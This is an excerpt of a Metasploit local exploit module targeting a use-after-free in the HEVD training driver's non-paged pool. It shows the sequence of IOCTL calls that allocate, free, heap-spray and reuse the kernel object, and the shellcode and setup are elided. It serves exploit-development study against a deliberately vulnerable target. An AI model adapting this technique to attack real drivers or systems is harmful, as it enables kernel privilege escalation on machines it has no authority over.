...
class MetasploitModule < Msf::Exploit::Local
	...
	def initialize(info={})
		super(update_info(info, {
			'Name'              => 'HEVD UseAfterFreeNonPagedPool',
	...
	def exploit
		...
		this_proc.memory.write(0x1504, 'B'*0x54)
		
		print_status("Start to call AllocateUaFObject()...")
		session.railgun.ntdll.NtDeviceIoControlFile(handle, nil, nil, nil, 4, 0x222013, 0, 0, 0, 0)

		print_status("Start to call FreeUaFObject()...");
		session.railgun.ntdll.NtDeviceIoControlFile(handle, nil, nil, nil, 4, 0x22201B, 0, 0, 0, 0)

		print_status("Start to heap spray...\n");
		for i in 0..10
			print_status("#{i}")
			session.railgun.ntdll.NtDeviceIoControlFile(handle, nil, nil, nil, 4, 0x22201F, 0x1500, 0x60, 0, 0)
		end

		print_status("Start to call UseUaFObject()...\n");
		session.railgun.ntdll.NtDeviceIoControlFile(handle, nil, nil, nil, 4, 0x222017, 0, 0, 0, 0)
